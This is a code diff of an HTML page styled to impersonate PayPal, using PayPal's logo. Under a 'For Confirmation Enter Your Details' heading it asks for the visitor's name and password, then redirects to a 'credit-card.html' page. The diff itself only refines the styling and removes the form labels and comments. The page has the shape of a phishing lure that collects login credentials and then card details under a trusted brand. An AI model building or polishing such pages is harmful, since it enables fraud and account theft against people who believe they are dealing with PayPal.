@@ -3,15 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enter Your Details</title>
+    <title>For Confirmation Enter Your Details</title>
     <style>
-        /* Add the same CSS from earlier */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             background: linear-gradient(135deg, #0070ba, #00488f);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+            line-height: 1.5;
         }
         .container {
             background-color: #fff;
@@ -24,14 +31,24 @@
         }
         input, button {
             width: 100%;
-            padding: 10px;
+            padding: 15px;
             margin: 10px 0;
+            font-size: 1rem;
         }
         button {
             background-color: #0070ba;
             color: white;
             border: none;
             border-radius: 8px;
+            cursor: pointer;
+        }
+        h2 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+        p {
+            margin-top: 20px;
+            font-size: 1rem;
         }
     </style>
 </head>
@@ -41,26 +58,17 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo" style="width: 150px;">
     <h2>For Confirmation Enter Your Details</h2>
     <form id="detailsForm">
-        <label for="firstName">First Name</label>
         <input type="text" id="firstName" name="firstName" placeholder="Enter your first name" required>
-        
-        <label for="lastName">Last Name</label>
         <input type="text" id="lastName" name="lastName" placeholder="Enter your last name" required>
-
-        <label for="fullName">Full Name</label>
         <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
-
-        <label for="password">Enter Password</label>
         <input type="password" id="password" name="password" placeholder="Enter your password" required>
-
         <button type="button" onclick="nextPage()">Submit</button>
     </form>
 </div>
 
 <script>
     function nextPage() {
-        // Perform validation or store data if needed
-        window.location.href = "credit-card.html"; // Redirect to the credit card page
+        window.location.href = "credit-card.html";
     }
 </script>
 
